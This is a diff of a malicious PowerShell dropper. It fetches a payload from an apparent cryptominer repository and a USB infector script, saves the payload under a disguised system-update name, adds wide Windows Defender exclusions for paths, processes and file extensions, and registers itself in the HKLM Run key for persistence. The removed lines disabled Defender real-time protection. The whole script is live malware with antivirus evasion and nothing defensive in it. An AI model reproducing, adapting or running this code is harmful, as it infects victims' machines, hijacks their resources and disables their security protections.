@@ -1,9 +1,11 @@
+# PowerShell script to add Windows Defender exclusions and set up defendnot-loader.exe
+
 Start-Sleep -Seconds 15
 
 $monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
-$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/one-sec.exe"
-$payloadPath = "C:\Windows\Temp\svchost_update.exe"
+$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/defendnot-loader.exe"
+$payloadPath = "C:\Windows\Temp\svchost_defender_update.exe"
 $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
 $crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
 $crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
@@ -17,51 +19,21 @@ function Is-Admin {
 
 $maxAttempts = 20
 $delayBetweenChecks = 5
-Start-Sleep -Seconds 5  # Initial delay to ensure service stability
 for ($i = 0; $i -lt $maxAttempts; $i++) {
     try {
-        if (-not (Is-Admin)) {
-            throw "Script must run with administrative privileges."
-        }
         $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
-        $mpStatus = Get-MpComputerStatus -ErrorAction Stop
+        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
         if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
-            # Attempt to disable real-time protection
-            Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction Stop
-            # Verify the change
-            $newMpStatus = Get-MpComputerStatus -ErrorAction Stop
-            if ($newMpStatus.RealTimeProtectionEnabled -eq $false) {
-                break
-            } else {
-                throw "Verification failed: Real-time protection still enabled."
-            }
-        } elseif ($defenderService.Status -ne 'Running') {
-            throw "Windows Defender service is not running."
+            break
         }
     } catch {
-        $errorMsg = "Attempt $i : $_"
-        Add-Content -Path "C:\Windows\Temp\script_error.log" -Value $errorMsg -ErrorAction SilentlyContinue
-        # Alternative method using registry (if PowerShell cmdlets fail)
-        try {
-            $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force -ErrorAction Stop | Out-Null
-            }
-            New-ItemProperty -Path $regPath -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWORD -Force -ErrorAction Stop
-            $newMpStatus = Get-MpComputerStatus -ErrorAction Stop
-            if ($newMpStatus.RealTimeProtectionEnabled -eq $false) {
-                break
-            }
-        } catch {
-            $errorMsg = "Attempt $i (Registry): $_"
-            Add-Content -Path "C:\Windows\Temp\script_error.log" -Value $errorMsg -ErrorAction SilentlyContinue
-        }
     }
     Start-Sleep -Seconds $delayBetweenChecks
 }
+
 $exclusionsPaths = @(
     "C:\Users\Public\SystemLib",
-    "C:\Windows\Temp\svchost_update.exe",
+    "C:\Windows\Temp\svchost_defender_update.exe",
     "C:\Windows\Temp\WindowsServices",
     "C:\Windows\Temp\update_package.zip",
     "C:\ProgramData\WinKit",
@@ -78,16 +50,17 @@ $exclusionsPaths = @(
     $monitorScriptPath
 )
 $exclusionsProcesses = @(
-    "svchost_update.exe",
+    "svchost_defender_update.exe",
     "ServiceHost.exe",
     "cmd.exe",
-    "powershell.exe"
+    "powershell.exe",
+    "defendnot-loader.exe"
 )
 $exclusionsExtensions = @(
     "exe",
     "dll",
-    "bat",
-    "cmd",
+    "bin",
+    "pdb",
     "ps1",
     "vbs",
     "js",
@@ -195,11 +168,10 @@ if (Test-Path -Path $payloadPath) {
 
 try {
     $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "WindowsUpdateCheck"
-    $scriptPath = $PSCommandPath
-    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $regName = "WindowsDefenderUpdate"
+    $command = "C:\Windows\Temp\svchost_defender_update.exe"
     $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
-    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
+    if ($regExists -and $regExists.WindowsDefenderUpdate -eq $command) {
     } else {
         if (-not (Test-Path $regPath)) {
             New-Item -Path $regPath -Force | Out-Null
